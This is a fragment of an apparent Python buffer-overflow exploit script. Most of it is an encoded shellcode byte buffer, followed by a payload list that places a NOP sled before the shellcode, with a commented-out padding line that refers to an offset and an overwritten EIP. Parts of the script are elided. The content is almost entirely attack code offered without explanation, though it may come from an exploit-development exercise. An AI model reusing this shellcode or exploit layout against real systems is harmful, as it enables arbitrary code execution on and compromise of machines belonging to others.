...
buf =  b""
buf += b"\xd9\xc1\xbb\xcd\x3c\x1b\xf9\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x59\x31\x5e\x19\x83\xc6\x04\x03\x5e\x15\x2f"
buf += b"\xc9\xe7\x11\x20\x32\x18\xe2\x5e\xba\xfd\xd3\x4c\xd8"
buf += b"\x76\x41\x40\xaa\xdb\x6a\x2b\xfe\xcf\xf9\x59\xd7\xde"
buf += b"\x02\x92\x90\x6b\xdb\x9d\x1e\xc7\x1f\xbc\xe2\x1a\x4c"
buf += b"\x1e\xda\xd4\x81\x5f\x1b\xa3\xec\xb0\xf1\xbf\x5d\x5e"
buf += b"\xa1\x34\x23\x62\x4c\x9b\x2f\xda\x36\x9e\xf0\xae\x8a"
buf += b"\xa1\x20\xc5\x4b\x82\x4b\x91\x73\x92\x4a\xf2\x01\xdb"
buf += b"\x39\xc8\x38\x23\x88\xbb\x0f\x50\x0a\x6d\x5e\xa6\xcc"
buf += b"\x5e\xac\x8a\xce\xa7\x97\x32\xa5\xd3\xeb\xcf\xbe\x20"
buf += b"\x91\x0b\x4a\xb6\x31\xdf\xec\x12\xc3\x0c\x6a\xd1\xcf"
buf += b"\xf9\xf8\xbd\xd3\xfc\x2d\xb6\xe8\x75\xd0\x18\x79\xcd"
buf += b"\xf7\xbc\x21\x95\x96\xe5\x8f\x78\xa6\xf5\x68\x24\x02"
buf += b"\x7e\x9a\x33\x32\x7f\x64\x3c\x6e\x17\xa8\xf1\x91\xe7"
buf += b"\xa6\x82\xe2\xd5\x69\x39\x6d\x55\xe1\xe7\x6a\xec\xe5"
buf += b"\x17\xa4\x56\x65\xe6\x45\xa6\xaf\x2d\x11\xf6\xc7\x84"
buf += b"\x1a\x9d\x17\x28\xcf\x0b\x12\xbe\x30\x63\x46\x20\xd9"
buf += b"\x71\x87\x4d\x45\xfc\x61\x3d\x25\xae\x3d\xfe\x95\x0e"
buf += b"\xee\x96\xff\x81\xd1\x87\xff\x48\x7a\x2d\x10\x24\xd2"
buf += b"\xda\x89\x6d\xa8\x7b\x55\xb8\xd4\xbc\xdd\x48\x28\x72"
buf += b"\x16\x39\x3a\x63\x41\xc1\xc2\x74\xe4\xc1\xa8\x70\xae"
buf += b"\x96\x44\x7b\x97\xd0\xca\x84\xf2\x63\x0c\x7a\x83\x55"
buf += b"\x66\x4d\x11\xd9\x10\xb2\xf5\xd9\xe0\xe4\x9f\xd9\x88"
buf += b"\x50\xc4\x8a\xad\x9e\xd1\xbf\x7d\x0b\xda\xe9\xd2\x9c"
buf += b"\xb2\x17\x0c\xea\x1c\xe8\x7b\x68\x5a\x16\xf9\x47\xc3"
buf += b"\x7e\x01\xd8\xf3\x7e\x6b\xd8\xa3\x16\x60\xf7\x4c\xd6"
buf += b"\x89\xd2\x04\x7e\x03\xb3\xe7\x1f\x14\x9e\xa6\x81\x15"
buf += b"\x2d\x73\x32\x6f\x5e\x84\xb3\x90\x76\xe1\xb4\x90\x76"
buf += b"\x17\x89\x46\x4f\x6d\xcc\x5a\xf4\x7e\x7b\xfe\x5d\x15"
buf += b"\x83\xac\x9e\x3c"
...
payload = [
    ...
    nop_sled,
    buf
    #b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - buf)
]
